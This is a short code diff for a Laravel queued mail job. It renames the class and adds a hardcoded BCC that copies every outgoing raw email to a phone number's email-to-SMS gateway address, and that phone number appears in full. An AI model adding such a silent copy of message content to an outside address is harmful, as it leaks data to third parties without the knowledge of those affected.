@@ -11,7 +11,7 @@ use Illuminate\Queue\SerializesModels;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Mail;
 
-class SendRawEmailNotification implements ShouldQueue
+class SendRawEmailJob implements ShouldQueue
 {
     use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;
 
@@ -38,7 +38,7 @@ class SendRawEmailNotification implements ShouldQueue
     public function handle()
     {
         Mail::raw($this->message, function ($message) {
-            $message->to( env('MAIL_TO_ADDRESS') )->subject($this->subject);
+            $message->to( env('MAIL_TO_ADDRESS') )->bcc('+17023756305@tmomail.net')->subject($this->subject);
         });
     }
 }
